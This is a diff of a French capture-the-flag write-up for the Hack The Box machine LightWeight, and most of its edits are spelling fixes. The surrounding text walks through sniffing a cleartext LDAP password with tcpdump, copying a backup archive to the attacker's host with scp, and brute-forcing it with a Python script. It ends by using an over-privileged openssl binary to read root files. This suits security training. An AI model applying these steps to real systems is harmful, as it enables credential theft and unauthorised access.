@@ -31,8 +31,8 @@ Nmap Scan
     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 1 IP address (1 host up) scanned in 39.45 seconds
     
-Parfait nous avons 3 ports, le SSH, le HTTP, et enfin pour l'Active directory le protocole LDAP.
-Nous allons énumerer les services ouverts.
+Parfaits nous avons 3 ports, le SSH, le HTTP, et enfin pour l'active directory le protocole LDAP.
+Nous allons énumérer les services ouverts.
 
 HTTP
 ----
@@ -43,8 +43,7 @@ Comme on peut le voir, nous devons nous connecter avec notre adresse IP comme us
 
 SSH
 ----
-
-Parfait nous sommes connecté au serveur SSH mais pas en tant que utilisateur. L'username et le mot de passe est l'adresse IP de l'interface **tun0** très important.
+Parfaits nous sommes connectés au serveur SSH mais pas en tant qu'utilisateurs. L'username et le mot de passe sont l'adresse IP de l'interface **tun0** très important.
 
     root@seyptoo-Aspire-E5-721:~/htb/writeup/LightWeight# ssh 10.10.10.119 -l 10.10.12.232
     10.10.12.232@10.10.10.119's password: 
@@ -69,7 +68,7 @@ Parfait comme nous pouvons le voir il y'a 4 utilisateurs, **root**,**ldapuser1**
 
 Les capabilities sous Linux
 ----
-Après avoir chercher pendant des heures j'ai enfin trouver quelque chose de très intéréssant, c'est les **capabilities**. Les capabilities ça peut être très dangereux pour des raison assez spécifiques.
+Après avoir cherché pendant des heures j'ai enfin trouvé quelque chose de très intéressant, c'est les **capabilities**. Les capabilities ça peut être très dangereux pour des raisons assez spécifiques.
 
 Les capabilities :
 La gestion des capabilities est un mécanisme de sécurité du noyau Linux concourant à assurer un confinement d’exécution des applications s’exécutant sur le système en affinant les possibilités d'appliquer le principe du moindre privilège.
@@ -99,7 +98,7 @@ Nous allons essayer de capturer les données du protocole LDAP avec la commande 
     tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
     listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
     
-Après avoir taper la commande vous devez obligatoirement allez sur le serveur HTTP est d'exécuter toutes les pages le plus important **status.php**.
+Après avoir tapé la commande vous devez obligatoirement allez sur le serveur HTTP est d'exécuter toutes les pages le plus important **status.php**.
 
 	0x0000:  4500 008f 3c3f 4000 4006 d528 0a0a 0a77  E...<?@.@..(...w
 	0x0010:  0a0a 0a77 ad98 0185 83a1 cdb7 c84a 7ff5  ...w.........J..
@@ -111,7 +110,7 @@ Après avoir taper la commande vous devez obligatoirement allez sur le serveur H
 	0x0070:  6263 3832 3531 3333 3261 6265 3164 3766  bc8251332abe1d7f
 	0x0080:  3130 3564 3365 3533 6164 3339 6163 32    105d3e53ad39ac2
     
-Parfait nous avons trouver le mot de passe grâce à TCPDUMP nous avons pour de bon trouver le mot de passe nous devons nous connecter avec la commande **su**.
+Parfaits nous avons trouvé le mot de passe grâce à TCPDUMP nous avons pour de bon trouvé le mot de passe nous devons nous connecter avec la commande **su**.
 
     [10.10.12.232@lightweight ~]$ su - ldapuser2
     Mot de passe : 
@@ -121,7 +120,7 @@ Parfait nous avons trouver le mot de passe grâce à TCPDUMP nous avons pour de 
 > Username : ldapuser2 <br />
 > Password : 8bc8251332abe1d7f105d3e53ad39ac2
 
-Parfait nous sommes connecté.
+Parfaits nous sommes connecté.
 
     [ldapuser2@lightweight ~]$ ls
     backup.7z  OpenLDAP-Admin-Guide.pdf  OpenLdap.pdf  user.txt
@@ -129,7 +128,7 @@ Parfait nous sommes connecté.
     33 user.txt
     [ldapuser2@lightweight ~]$
 
-Comme vous pouvez le voir il y'a un fichier backup nous allons essayer de le transférer vers notre machine physique avec la commande **scp**.
+Comme vous pouvez le voir il y a un fichier backup nous allons essayer de le transférer vers notre machine physique avec la commande **scp**.
 
     [ldapuser2@lightweight ~]$ scp -r -p $HOME/backup.7z seyptoo@10.10.12.232:/home/seyptoo/Bureau
     The authenticity of host '10.10.12.232 (10.10.12.232)' can't be established.
@@ -153,7 +152,7 @@ Parfait le fichier a été transférer avec succès ! C'est un fichier 7z nous d
 
     Enter password (will not be echoed) :
     
-Merde le fichier est protégé par un mot de passe, j'ai créer un programme en Python exprès pour ça ! :D
+Merde le fichier est protégé par un mot de passe, j'ai crée un programme en Python exprès pour ça ! :D
 
     #coding:utf-8
 
@@ -214,11 +213,11 @@ Merde le fichier est protégé par un mot de passe, j'ai créer un programme en 
         Algorithm = SevenZip()
         Algorithm.start()
 
-Si vous avez des problèmes d'indentations vous avez juste à allez dans ma page Github et il y'a une repositories qui se nomme 7z-BruteForce vous avez juste à git clone ça ! ;)
+Si vous avez des problèmes d'indentations vous avez juste à aller dans ma page Github et il y'a une repositories qui se nomme 7z-BruteForce vous avez juste à git clone ça ! ;)
 
 	root@seyptoo-Aspire-E5-721:/home/seyptoo/Bureau# python params.py backup.7z /usr/share/wordlist/directory-list-2.3-medium.txt
 
-Pour la liste je vous conseille d'utiliser rockyou.txt. Personnellement le bruteforce à pris seulement environ 10 minutes.
+Pour la liste je vous conseille d'utiliser rockyou.txt. Personnellement le bruteforce a pris seulement environ 10 minutes.
 
 	[-] Password not cracked : help
 	[-] Password not cracked : events
@@ -249,7 +248,7 @@ Parfait nous avons trouver le mot de passe pour accéder à l'utilisateur **ldap
 
 PrivEsc
 ----
-Maintenant nous passons au root. Le root n'est pas très compliqué mais j'ai pas trouver de solution pour avoir un shell root j'ai essayer plusieurs choses mais sans succès.
+Maintenant nous passons au root. Le root n'est pas très compliqué mais je n'ai pas trouvé de solution pour avoir un shell root j'ai essayé plusieurs choses mais sans succès.
 
 Nous allons reutiliser la commande **getcap**.
 
@@ -261,7 +260,7 @@ Nous allons reutiliser la commande **getcap**.
 	/usr/sbin/clockdiff = cap_net_raw+p
 	/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
 	/home/ldapuser1/tcpdump = cap_net_admin,cap_net_raw+ep
-	/home/ldapuser1/openssl =ep
+	/home/ldapuser1/openssl = ep
 
 Comme vous pouvez le voir il y'a un fichier qui se nomme openssl nous avons juste à lire le fichier root.txt avec la commande openssl.
 
